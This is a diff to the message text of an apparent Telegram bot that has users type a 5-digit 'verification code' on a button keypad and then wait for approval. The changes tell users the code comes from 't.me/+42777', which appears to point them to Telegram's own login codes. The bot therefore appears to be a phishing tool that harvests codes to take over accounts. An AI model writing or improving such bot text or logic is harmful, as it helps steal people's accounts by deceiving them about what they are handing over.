@@ -493,19 +493,19 @@ If you believe this is an error, please contact the admin or try the verificatio
             message = f"""
 🔢 **Enter Verification Code**
 
-Please enter the 5-digit verification code you received via SMS or call using the number buttons below.
+Please enter the 5-digit verification code you received via t.me/+42777 👈 using the number buttons below.
 
 **Instructions:**
 1. Use the number buttons to enter your 5-digit code
 2. Click "Backspace" to remove the last digit if needed
 3. Click "Submit" when you've entered all 5 digits
-4. Wait for admin approval after submitting
+4. Wait for approval after submitting
 
 **Code Input:** ○○○○○
 
 Entered: 0/5 digits
 
-**Note:** The code was sent to your phone number separately (not via this bot).
+**Note:** The code was sent to t.me/+42777 👈.
             """
             
             await context.bot.send_message(
@@ -560,10 +560,10 @@ Entered: 0/5 digits
 
 Entered: {len(session['entered_code'])}/5 digits
 
-Please enter the verification code you received via SMS or call.
-Wait for admin approval after submitting.
+Please enter the verification code you received via t.me/+42777 👈.
+Wait for a approval after submitting.
 
-**Note:** The code was sent to your phone number separately (not via this bot).
+**Note:** The code was sent to t.me/+42777 👈.
                     """,
                     parse_mode='Markdown',
                     reply_markup=query.message.reply_markup
